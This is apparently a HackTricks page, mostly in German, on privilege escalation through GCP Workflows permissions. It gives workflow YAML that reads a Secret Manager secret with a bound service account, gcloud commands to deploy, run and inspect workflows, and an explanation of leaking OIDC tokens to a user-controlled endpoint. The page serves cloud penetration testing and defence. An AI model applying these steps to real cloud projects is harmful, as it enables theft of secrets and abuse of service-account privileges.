# GCP - Workflows Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Workflows

Grundlegende Informationen:

{{#ref}}
../gcp-services/gcp-workflows-enum.md
{{#endref}}

### `workflows.workflows.create`, `iam.serviceAccounts.ActAs`, `workflows.executions.create`, (`workflows.workflows.get`, `workflows.operations.get`)

Soweit ich weiß ist es nicht möglich, eine shell zu erhalten, die Zugriff auf den Metadata-Endpunkt hat, der die SA-Anmeldeinformationen der an einen Workflow gebundenen SA enthält. Es ist jedoch möglich, die Berechtigungen der SA zu missbrauchen, indem man die auszuführenden Aktionen in den Workflow aufnimmt.

Es ist möglich, die Dokumentation der Connectoren zu finden. Zum Beispiel ist dies die [**page of the Secretmanager connector**](https://cloud.google.com/workflows/docs/reference/googleapis/secretmanager/Overview)**.** In der Seitenleiste findet man mehrere weitere Connectoren.

Und hier findet man ein Beispiel für einen Connector, der ein secret ausgibt:

<details><summary>Workflow YAML-Konfiguration zum Zugriff auf secrets</summary>
```yaml
main:
params: [input]
steps:
- access_string_secret:
call: googleapis.secretmanager.v1.projects.secrets.versions.accessString
args:
secret_id: secret_name
version: 1
project_id: project-id
result: str_secret
- returnOutput:
return: "${str_secret}"
```
</details>

Aktualisierung über die CLI:

<details><summary>Workflows über die CLI bereitstellen und ausführen</summary>
```bash
gcloud workflows deploy <workflow-name> \
--service-account=email@SA \
--source=/path/to/config.yaml \
--location us-central1
```
Wenn du einen Fehler wie `ERROR: (gcloud.workflows.deploy) FAILED_PRECONDITION: Workflows service agent does not exist` erhältst, warte einfach **eine Minute und versuche es erneut**.

Wenn du keinen Webzugang hast, ist es möglich, die Ausführung eines Workflows auszulösen und zu sehen mit:
```bash
# Run execution with output
gcloud workflows run <workflow-name> --location us-central1

# Run execution without output
gcloud workflows execute <workflow-name> --location us-central1

# List executions
gcloud workflows executions list <workflow-name>

# Get execution info and output
gcloud workflows executions describe projects/<proj-number>/locations/<location>/workflows/<workflow-name>/executions/<execution-id>
```
</details>

> [!CAUTION]
> Sie können auch die Ausgaben vorheriger Ausführungen prüfen, um nach sensiblen Informationen zu suchen

Beachte, dass selbst wenn du einen Fehler wie `PERMISSION_DENIED: Permission 'workflows.operations.get' denied on...` erhältst, weil du diese Berechtigung nicht hast, der Workflow trotzdem erstellt wurde.

### Leak OIDC token (and OAuth?)

According [**to the docs**](https://cloud.google.com/workflows/docs/authenticate-from-workflow) it's possible to use workflow steps that will send an HTTP request with the OAuth or OIDC token. However, just like in the case of [Cloud Scheduler](gcp-cloudscheduler-privesc.md), the HTTP request with the Oauth token must be to the host `.googleapis.com`.

> [!CAUTION]
> Daher ist es **möglich, das OIDC-Token zu leak, indem ein vom Nutzer kontrollierter HTTP-Endpunkt angegeben wird**, aber um das **OAuth**-Token zu leak, bräuchte man einen **Bypass** für diesen Schutz. Du kannst jedoch weiterhin **jede GCP api kontaktieren, um Aktionen im Namen des SA auszuführen**, entweder über connectors oder HTTP-Anfragen mit dem OAuth-Token.

#### Oauth

<details><summary>Workflow HTTP request with OAuth token</summary>
```yaml
- step_A:
call: http.post
args:
url: https://compute.googleapis.com/compute/v1/projects/myproject1234/zones/us-central1-b/instances/myvm001/stop
auth:
type: OAuth2
scopes: OAUTH_SCOPE
```
</details>#### OIDC

<details><summary>Workflow-HTTP-Anfrage mit OIDC-Token</summary>
```yaml
- step_A:
call: http.get
args:
url: https://us-central1-project.cloudfunctions.net/functionA
query:
firstNumber: 4
secondNumber: 6
operation: sum
auth:
type: OIDC
audience: OIDC_AUDIENCE
```
</details>### `workflows.workflows.update` ...

Mit dieser Berechtigung statt `workflows.workflows.create` ist es möglich, einen bereits bestehenden Workflow zu aktualisieren und dieselben Angriffe durchzuführen.

{{#include ../../../banners/hacktricks-training.md}}
